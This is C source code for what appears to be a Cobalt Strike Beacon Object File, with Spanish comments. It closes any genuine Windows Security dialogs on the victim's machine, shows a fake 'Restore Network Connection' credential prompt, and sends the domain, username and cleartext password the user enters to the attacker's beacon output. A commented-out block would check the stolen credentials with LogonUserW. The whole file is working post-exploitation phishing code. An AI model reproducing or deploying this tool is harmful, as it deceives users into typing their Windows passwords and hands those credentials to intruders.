#define SECURITY_WIN32 

#include <windows.h>
#include <wincred.h>
#include <security.h>
#include <shlwapi.h>

#include "Askcreds.h"
#include "beacon.h"

#define TIMEOUT 60
#define REASON L"Restore Network Connection"
#define MESSAGE L"Please verify your Windows user credentials to proceed."

// === GLOBALS ===
WCHAR g_szUsername[MAXLEN] = {0};
WCHAR g_szPassword[MAXLEN] = {0};
WCHAR g_szDomain[MAXLEN] = {0};
DWORD g_dwCredResult = ERROR_CANCELLED;
BOOL  g_bCredDone = FALSE;

// === ENUMERAR Y CERRAR VENTANAS ===
BOOL CALLBACK EnumWindowsProc(HWND hWnd, LPARAM lParam) {
    CHAR chWindowTitle[1024];
    DWORD dwProcId = 0; 

    if (!hWnd || !USER32$IsWindowVisible(hWnd)) return TRUE;

    LONG_PTR lStyle = USER32$GetWindowLongPtrA(hWnd, GWL_STYLE);
    if (!USER32$GetWindowThreadProcessId(hWnd, &dwProcId)) return TRUE;

    MSVCRT$memset(chWindowTitle, 0, sizeof(chWindowTitle));
    if (!USER32$SendMessageA(hWnd, WM_GETTEXT, sizeof(chWindowTitle), (LPARAM)chWindowTitle)) return TRUE;

    if (MSVCRT$_stricmp(chWindowTitle, "Windows Security") == 0) {
        USER32$PostMessageA(hWnd, WM_CLOSE, 0, 0);
    }
    else if ((dwProcId == KERNEL32$GetCurrentProcessId()) && (WS_POPUPWINDOW == (lStyle & WS_POPUPWINDOW))) {
        USER32$PostMessageA(hWnd, WM_CLOSE, 0, 0);
    }
    else {
        WCHAR szFileName[MAX_PATH] = {0};
        DWORD dwSize = MAX_PATH;
        HANDLE hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcId);
        if (hProcess) {
            if (KERNEL32$QueryFullProcessImageNameW(hProcess, 0, szFileName, &dwSize)) {
                if (SHLWAPI$StrStrIW(szFileName, L"CredentialUIBroker.exe")) {
                    USER32$PostMessageA(hWnd, WM_CLOSE, 0, 0);
                }
            }
            KERNEL32$CloseHandle(hProcess);
        }
    }
    return TRUE;
}

// === HILO SECUNDARIO (SOLO UN PARAM: title) ===
DWORD WINAPI AskCreds(LPVOID lpParameter) {
    LPCWSTR lpwTitle = (LPCWSTR)lpParameter;
    if (!lpwTitle || !lpwTitle[0]) lpwTitle = REASON;

    CREDUI_INFOW credUiInfo = {0};
    credUiInfo.cbSize = sizeof(credUiInfo);
    credUiInfo.pszCaptionText = lpwTitle;
    credUiInfo.pszMessageText = MESSAGE;
    credUiInfo.hbmBanner = NULL;
    credUiInfo.hwndParent = USER32$GetForegroundWindow();

    DWORD authPackage = 0;
    WCHAR szUsername[MAXLEN] = {0};
    ULONG nSize = MAXLEN;
    LPVOID inCredBuffer = NULL, outCredBuffer = NULL;
    ULONG inCredSize = 0, outCredSize = 0;
    BOOL bSave = FALSE;

    if (!SECUR32$GetUserNameExW(NameSamCompatible, szUsername, &nSize)) {
        szUsername[0] = L'\0';
    }

    if (!CREDUI$CredPackAuthenticationBufferW(CRED_PACK_GENERIC_CREDENTIALS, szUsername, L"", NULL, &inCredSize) &&
        KERNEL32$GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
        inCredBuffer = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, inCredSize);
        if (inCredBuffer) {
            CREDUI$CredPackAuthenticationBufferW(CRED_PACK_GENERIC_CREDENTIALS, szUsername, L"", inCredBuffer, &inCredSize);
        }
    }

    DWORD dwRet = CREDUI$CredUIPromptForWindowsCredentialsW(
        &credUiInfo, 0, &authPackage,
        inCredBuffer, inCredSize,
        &outCredBuffer, &outCredSize,
        &bSave, CREDUIWIN_GENERIC | CREDUIWIN_CHECKBOX
    );

    if (dwRet == ERROR_SUCCESS && outCredBuffer) {
        DWORD dwUser = MAXLEN, dwPass = MAXLEN, dwDomain = MAXLEN;
        CREDUI$CredUnPackAuthenticationBufferW(0, outCredBuffer, outCredSize,
            g_szUsername, &dwUser, g_szDomain, &dwDomain, g_szPassword, &dwPass);
    }

    g_dwCredResult = dwRet;

    if (inCredBuffer) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, inCredBuffer);
    if (outCredBuffer) {
        MSVCRT$memset(outCredBuffer, 0, outCredSize);
        OLE32$CoTaskMemFree(outCredBuffer);
    }

    g_bCredDone = TRUE;
    return dwRet;
}

// === ENTRY POINT ===
VOID go(IN PCHAR Args, IN ULONG Length) {
// === EN go() ===
datap parser;
BeaconDataParse(&parser, Args, Length);

WCHAR wReason[256] = {0};
LPCWSTR lpwReason = REASON;

int len = BeaconDataLength(&parser);
if (len > 0) {
    char* src = BeaconDataExtract(&parser, &len);
    if (src && len > 0) {
        char temp[256] = {0};
        int copy = min(len, 250);
        MSVCRT$memcpy(temp, src, copy);
        temp[copy] = '\0';

        if (toWideChar(temp, wReason, 256)) {
            lpwReason = wReason;
        }
    }
}

    g_bCredDone = FALSE;
    g_dwCredResult = ERROR_CANCELLED;
    g_szUsername[0] = g_szPassword[0] = g_szDomain[0] = L'\0';

    char buf[512];
    MSVCRT$sprintf(buf, "[*] Título: %ls", lpwReason);
    BeaconPrintf(CALLBACK_OUTPUT, "%s", buf);

    USER32$EnumWindows(EnumWindowsProc, 0);

    HANDLE hThread = KERNEL32$CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)AskCreds, (LPVOID)lpwReason, 0, NULL);
    if (!hThread) {
        BeaconPrintf(CALLBACK_ERROR, "CreateThread failed.");
        return;
    }

    DWORD start = KERNEL32$GetTickCount();
    while ((KERNEL32$GetTickCount() - start) < (TIMEOUT * 1000)) {
        if (g_bCredDone) break;
        KERNEL32$Sleep(500);
    }

    if (!g_bCredDone) {
        BeaconPrintf(CALLBACK_ERROR, "[TIMEOUT]");
        USER32$EnumWindows(EnumWindowsProc, 0);
        //KERNEL32$TerminateThread(hThread, 1);
    } else {
        if (g_dwCredResult == ERROR_SUCCESS) {
            WCHAR* fullUser = g_szUsername;
            WCHAR* domain = g_szDomain[0] ? g_szDomain : NULL;
            WCHAR* user = fullUser;

            WCHAR* backslash = MSVCRT$wcschr(fullUser, L'\\');
            if (backslash) {
                *backslash = L'\0';
                domain = fullUser;
                user = backslash + 1;
            } else if (!domain || !domain[0]) {
                domain = L".";
            }

            MSVCRT$sprintf(buf, "[+] Credential\n\tDomain: %ls\n\tUsername: %ls\n\tPassword: %ls", domain, user, g_szPassword);
            BeaconPrintf(CALLBACK_OUTPUT, "%s", buf);

            /*
            HANDLE hToken = NULL;
            if (ADVAPI32$LogonUserW(user, domain, g_szPassword, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &hToken)) {
                MSVCRT$sprintf(buf, "[+] Valid Credential\n\tDomain: %ls\n\tUsername: %ls\n\tPassword: %ls", domain, user, g_szPassword);
                BeaconPrintf(CALLBACK_OUTPUT, "%s", buf);
                KERNEL32$CloseHandle(hToken);
            } else {
                DWORD err = KERNEL32$GetLastError();
                MSVCRT$sprintf(buf, "[-] Invalid Credential (Error: %d)\n\tDomain: %ls\n\tUsername: %ls\n\tPassword: %ls", err, domain, user, g_szPassword);
                BeaconPrintf(CALLBACK_ERROR, "%s", buf);
            }
            */
            MSVCRT$memset(g_szPassword, 0, sizeof(g_szPassword));
        } else if (g_dwCredResult == ERROR_CANCELLED) {
            BeaconPrintf(CALLBACK_OUTPUT, "[-] Cancelado.");
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[-] Error: %d", g_dwCredResult);
        }
    }

    KERNEL32$CloseHandle(hThread);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] BOF finalizado.");
}